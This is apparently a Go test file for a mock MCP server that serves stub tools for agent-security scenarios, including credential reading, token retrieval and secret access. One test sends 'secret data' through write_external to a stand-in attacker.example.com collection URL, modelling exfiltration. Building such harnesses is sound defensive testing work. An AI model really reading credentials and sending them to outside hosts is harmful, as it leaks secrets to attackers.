// Copyright 2026 Eunolabs, LLC
// SPDX-License-Identifier: Apache-2.0

package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

// post sends a POST /mcp request and returns the ResponseRecorder.
func post(t *testing.T, srv *server, body, sessionID string) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest(http.MethodPost, "/mcp", bytes.NewBufferString(body))
	req.Header.Set("Content-Type", "application/json")
	if sessionID != "" {
		req.Header.Set(sessionHeader, sessionID)
	}
	w := httptest.NewRecorder()
	srv.ServeHTTP(w, req)
	return w
}

// decodeMsg parses the response body as a JSON-RPC message.
func decodeMsg(t *testing.T, w *httptest.ResponseRecorder) rpcMsg {
	t.Helper()
	var msg rpcMsg
	if err := json.Unmarshal(w.Body.Bytes(), &msg); err != nil {
		t.Fatalf("decoding response: %v\nbody: %s", err, w.Body.String())
	}
	return msg
}

// initSession calls initialize and returns the session ID from the response header.
func initSession(t *testing.T, srv *server) string {
	t.Helper()
	w := post(t, srv, `{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}`, "")
	if w.Code != http.StatusOK {
		t.Fatalf("initialize: expected 200, got %d", w.Code)
	}
	sid := w.Header().Get(sessionHeader)
	if sid == "" {
		t.Fatal("initialize: missing Mcp-Session-Id header")
	}
	return sid
}

// toolCall issues a tools/call request and returns decoded message.
func toolCall(t *testing.T, srv *server, sid, toolName string, args map[string]interface{}) rpcMsg {
	t.Helper()
	params := map[string]interface{}{"name": toolName, "arguments": args}
	paramsJSON, err := json.Marshal(params)
	if err != nil {
		t.Fatalf("marshal params: %v", err)
	}
	body := fmt.Sprintf(`{"jsonrpc":"2.0","id":1,"method":"tools/call","params":%s}`, paramsJSON)
	w := post(t, srv, body, sid)
	if w.Code != http.StatusOK {
		t.Fatalf("tools/call(%s): expected 200, got %d; body: %s", toolName, w.Code, w.Body.String())
	}
	return decodeMsg(t, w)
}

func TestInitialize_CreatesSession(t *testing.T) {
	srv := newServer()
	w := post(t, srv, `{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}`, "")
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}
	sid := w.Header().Get(sessionHeader)
	if sid == "" {
		t.Fatal("expected Mcp-Session-Id header")
	}
	srv.mu.RLock()
	_, ok := srv.sessions[sid]
	srv.mu.RUnlock()
	if !ok {
		t.Fatal("session not found in server map")
	}
	msg := decodeMsg(t, w)
	if msg.Error != nil {
		t.Fatalf("unexpected error: %+v", msg.Error)
	}
	var result struct {
		ProtocolVersion string `json:"protocolVersion"`
		ServerInfo      struct {
			Name string `json:"name"`
		} `json:"serverInfo"`
	}
	if err := json.Unmarshal(msg.Result, &result); err != nil {
		t.Fatalf("parsing result: %v", err)
	}
	if result.ProtocolVersion != mcpProtocolVersion {
		t.Errorf("protocolVersion: want %q, got %q", mcpProtocolVersion, result.ProtocolVersion)
	}
	if result.ServerInfo.Name != serverName {
		t.Errorf("serverInfo.name: want %q, got %q", serverName, result.ServerInfo.Name)
	}
}

func TestInitialize_UniqueSessionIDs(t *testing.T) {
	srv := newServer()
	s1 := initSession(t, srv)
	s2 := initSession(t, srv)
	if s1 == s2 {
		t.Error("expected distinct session IDs")
	}
}

func TestToolsCall_RequiresSession(t *testing.T) {
	srv := newServer()
	body := `{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"read_credentials","arguments":{"service":"aws"}}}`
	w := post(t, srv, body, "")
	if w.Code != http.StatusBadRequest {
		t.Errorf("expected 400, got %d", w.Code)
	}
}

func TestToolsCall_UnknownSession(t *testing.T) {
	srv := newServer()
	body := `{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"read_credentials","arguments":{"service":"aws"}}}`
	w := post(t, srv, body, "no-such-session")
	if w.Code != http.StatusNotFound {
		t.Errorf("expected 404, got %d", w.Code)
	}
}

func TestToolsList_ReturnsAllTools(t *testing.T) {
	srv := newServer()
	sid := initSession(t, srv)
	w := post(t, srv, `{"jsonrpc":"2.0","id":2,"method":"tools/list","params":{}}`, sid)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}
	msg := decodeMsg(t, w)
	if msg.Error != nil {
		t.Fatalf("unexpected error: %+v", msg.Error)
	}
	var result struct {
		Tools []struct {
			Name string `json:"name"`
		} `json:"tools"`
	}
	if err := json.Unmarshal(msg.Result, &result); err != nil {
		t.Fatalf("parsing tools/list result: %v", err)
	}
	wantTools := map[string]bool{
		"read_credentials": true,
		"write_external":   true,
		"read_file":        true,
		"write_file":       true,
		"read_config":      true,
		"update_config":    true,
		"read_log":         true,
		"delete_file":      true,
		"stat_file":        true,
		"read_secret":      true,
		"write_secret":     true,
		"read_backup":      true,
		"get_aws_token":    true,
		"get_github_token": true,
	}
	for _, tool := range result.Tools {
		delete(wantTools, tool.Name)
	}
	if len(wantTools) > 0 {
		t.Errorf("missing tools: %v", wantTools)
	}
}

// ── Scenario 1 tools ─────────────────────────────────────────────────────────

func TestReadCredentials(t *testing.T) {
	srv := newServer()
	sid := initSession(t, srv)
	msg := toolCall(t, srv, sid, "read_credentials", map[string]interface{}{"service": "aws"})
	if msg.Error != nil {
		t.Fatalf("unexpected error: %+v", msg.Error)
	}
	var result struct {
		Content []struct{ Text string `json:"text"` } `json:"content"`
	}
	if err := json.Unmarshal(msg.Result, &result); err != nil {
		t.Fatalf("parsing result: %v", err)
	}
	if len(result.Content) == 0 {
		t.Fatal("expected content")
	}
	if !strings.Contains(result.Content[0].Text, "access_key_id") {
		t.Errorf("expected creds in response; got: %s", result.Content[0].Text)
	}
}

func TestWriteExternal(t *testing.T) {
	srv := newServer()
	sid := initSession(t, srv)
	msg := toolCall(t, srv, sid, "write_external", map[string]interface{}{
		"url":     "https://attacker.example.com/collect",
		"payload": "secret data",
	})
	if msg.Error != nil {
		t.Fatalf("unexpected error: %+v", msg.Error)
	}
	var result struct {
		Content []struct{ Text string `json:"text"` } `json:"content"`
	}
	if err := json.Unmarshal(msg.Result, &result); err != nil {
		t.Fatalf("parsing result: %v", err)
	}
	if !strings.Contains(result.Content[0].Text, "accepted") {
		t.Errorf("expected accepted in response; got: %s", result.Content[0].Text)
	}
}

// ── Scenario 2 tools ─────────────────────────────────────────────────────────

func TestScenario2Tools(t *testing.T) {
	srv := newServer()
	sid := initSession(t, srv)

	cases := []struct {
		tool string
		args map[string]interface{}
		want string
	}{
		{"read_file", map[string]interface{}{"path": "/reports/q3.pdf"}, "read_file"},
		{"write_file", map[string]interface{}{"path": "/tmp/out.txt", "content": "hello"}, "write_file"},
		{"read_config", map[string]interface{}{"path": "/etc/app.yaml"}, "read_config"},
		{"update_config", map[string]interface{}{"path": "/etc/app.yaml", "key": "k", "value": "v"}, "update_config"},
		{"read_log", map[string]interface{}{"path": "/var/log/app.log"}, "read_log"},
		{"delete_file", map[string]interface{}{"path": "/tmp/old.txt"}, "delete_file"},
		{"stat_file", map[string]interface{}{"path": "/data/x"}, "stat_file"},
		{"read_secret", map[string]interface{}{"path": "/secrets/db"}, "read_secret"},
		{"write_secret", map[string]interface{}{"path": "/secrets/new", "value": "s"}, "write_secret"},
		{"read_backup", map[string]interface{}{"path": "/backups/2026.tar.gz"}, "read_backup"},
	}

	for _, tc := range cases {
		t.Run(tc.tool, func(t *testing.T) {
			msg := toolCall(t, srv, sid, tc.tool, tc.args)
			if msg.Error != nil {
				t.Fatalf("unexpected error: %+v", msg.Error)
			}
			var result struct {
				Content []struct{ Text string `json:"text"` } `json:"content"`
			}
			if err := json.Unmarshal(msg.Result, &result); err != nil {
				t.Fatalf("parsing result: %v", err)
			}
			if len(result.Content) == 0 {
				t.Fatal("expected content")
			}
			if !strings.Contains(result.Content[0].Text, tc.want) {
				t.Errorf("want %q in response; got: %s", tc.want, result.Content[0].Text)
			}
		})
	}
}

// ── Scenario 3 tools ─────────────────────────────────────────────────────────

func TestGetAWSToken(t *testing.T) {
	srv := newServer()
	sid := initSession(t, srv)
	msg := toolCall(t, srv, sid, "get_aws_token", map[string]interface{}{
		"role": "arn:aws:iam::123456789012:role/MyRole",
	})
	if msg.Error != nil {
		t.Fatalf("unexpected error: %+v", msg.Error)
	}
	var result struct {
		Content []struct{ Text string `json:"text"` } `json:"content"`
	}
	if err := json.Unmarshal(msg.Result, &result); err != nil {
		t.Fatalf("parsing result: %v", err)
	}
	text := result.Content[0].Text
	if !strings.Contains(text, "expires_in") {
		t.Errorf("expected expires_in in token response; got: %s", text)
	}
	if !strings.Contains(text, "900") {
		t.Errorf("expected 900s expiry; got: %s", text)
	}
}

func TestGetGitHubToken(t *testing.T) {
	srv := newServer()
	sid := initSession(t, srv)
	msg := toolCall(t, srv, sid, "get_github_token", map[string]interface{}{"scope": "repo:read"})
	if msg.Error != nil {
		t.Fatalf("unexpected error: %+v", msg.Error)
	}
	var result struct {
		Content []struct{ Text string `json:"text"` } `json:"content"`
	}
	if err := json.Unmarshal(msg.Result, &result); err != nil {
		t.Fatalf("parsing result: %v", err)
	}
	text := result.Content[0].Text
	if !strings.Contains(text, "token") {
		t.Errorf("expected token in response; got: %s", text)
	}
}

// ── Error cases ──────────────────────────────────────────────────────────────

func TestUnknownTool(t *testing.T) {
	srv := newServer()
	sid := initSession(t, srv)
	body := `{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"drop_database","arguments":{}}}`
	w := post(t, srv, body, sid)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200 (JSON-RPC error body), got %d", w.Code)
	}
	msg := decodeMsg(t, w)
	if msg.Error == nil {
		t.Fatal("expected JSON-RPC error for unknown tool")
	}
	if !strings.Contains(msg.Error.Message, "drop_database") {
		t.Errorf("error should name the tool; got: %s", msg.Error.Message)
	}
}

func TestUnknownMethod(t *testing.T) {
	srv := newServer()
	sid := initSession(t, srv)
	body := `{"jsonrpc":"2.0","id":4,"method":"resources/list","params":{}}`
	w := post(t, srv, body, sid)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}
	msg := decodeMsg(t, w)
	if msg.Error == nil || msg.Error.Code != -32601 {
		t.Errorf("expected -32601 method-not-found; got %+v", msg.Error)
	}
}

func TestNotification_Accepted(t *testing.T) {
	srv := newServer()
	body := `{"jsonrpc":"2.0","method":"notifications/initialized","params":{}}`
	w := post(t, srv, body, "")
	if w.Code != http.StatusAccepted {
		t.Errorf("expected 202 for notification, got %d", w.Code)
	}
}

func TestSessionDelete(t *testing.T) {
	srv := newServer()
	sid := initSession(t, srv)
	req := httptest.NewRequest(http.MethodDelete, "/mcp", http.NoBody)
	req.Header.Set(sessionHeader, sid)
	w := httptest.NewRecorder()
	srv.ServeHTTP(w, req)
	if w.Code != http.StatusNoContent {
		t.Fatalf("expected 204, got %d", w.Code)
	}
	srv.mu.RLock()
	_, ok := srv.sessions[sid]
	srv.mu.RUnlock()
	if ok {
		t.Error("session should have been deleted")
	}
}

func TestMethodNotAllowed(t *testing.T) {
	srv := newServer()
	req := httptest.NewRequest(http.MethodPut, "/mcp", http.NoBody)
	w := httptest.NewRecorder()
	srv.ServeHTTP(w, req)
	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("expected 405, got %d", w.Code)
	}
}

func TestNotFoundPath(t *testing.T) {
	srv := newServer()
	req := httptest.NewRequest(http.MethodGet, "/healthz", http.NoBody)
	w := httptest.NewRecorder()
	srv.ServeHTTP(w, req)
	if w.Code != http.StatusNotFound {
		t.Errorf("expected 404, got %d", w.Code)
	}
}

func TestInvalidJSON(t *testing.T) {
	srv := newServer()
	req := httptest.NewRequest(http.MethodPost, "/mcp", bytes.NewBufferString("not json"))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	srv.ServeHTTP(w, req)
	if w.Code != http.StatusBadRequest {
		t.Errorf("expected 400, got %d", w.Code)
	}
}

func TestDispatchTool(t *testing.T) {
	cases := []struct {
		name string
		args map[string]interface{}
		want string
	}{
		{"read_credentials", map[string]interface{}{"service": "mydb"}, "access_key_id"},
		{"write_external", map[string]interface{}{"url": "http://x.com", "payload": "abc"}, "accepted"},
		{"read_file", map[string]interface{}{"path": "/reports/x.pdf"}, "read_file"},
		{"write_file", map[string]interface{}{"path": "/tmp/a", "content": "hello"}, "write_file"},
		{"read_config", map[string]interface{}{"path": "/etc/x.yaml"}, "read_config"},
		{"update_config", map[string]interface{}{"path": "/etc/x.yaml", "key": "k", "value": "v"}, "update_config"},
		{"read_log", map[string]interface{}{"path": "/log/x.log"}, "read_log"},
		{"delete_file", map[string]interface{}{"path": "/tmp/x"}, "delete_file"},
		{"stat_file", map[string]interface{}{"path": "/data/x"}, "stat_file"},
		{"read_secret", map[string]interface{}{"path": "/secrets/x"}, "read_secret"},
		{"write_secret", map[string]interface{}{"path": "/secrets/x", "value": "s"}, "write_secret"},
		{"read_backup", map[string]interface{}{"path": "/bkp/x.tgz"}, "read_backup"},
		{"get_aws_token", map[string]interface{}{"role": "arn:aws:iam::123:role/R"}, "expires_in"},
		{"get_github_token", map[string]interface{}{"scope": "repo"}, "token"},
	}
	for _, tc := range cases {
		got := dispatchTool(tc.name, tc.args)
		if !strings.Contains(got, tc.want) {
			t.Errorf("dispatchTool(%q): want %q in %q", tc.name, tc.want, got)
		}
	}
	if got := dispatchTool("nonexistent", nil); got != "" {
		t.Errorf("expected empty for unknown tool, got %q", got)
	}
}

func TestConcurrentSessions(t *testing.T) {
	srv := newServer()
	const n = 20
	sids := make([]string, n)
	for i := range n {
		sids[i] = initSession(t, srv)
	}
	seen := make(map[string]bool)
	for _, sid := range sids {
		if seen[sid] {
			t.Fatalf("duplicate session ID: %s", sid)
		}
		seen[sid] = true
	}
	for _, sid := range sids {
		w := post(t, srv, `{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}`, sid)
		if w.Code != http.StatusOK {
			t.Errorf("session %s: tools/list returned %d", sid, w.Code)
		}
	}
}
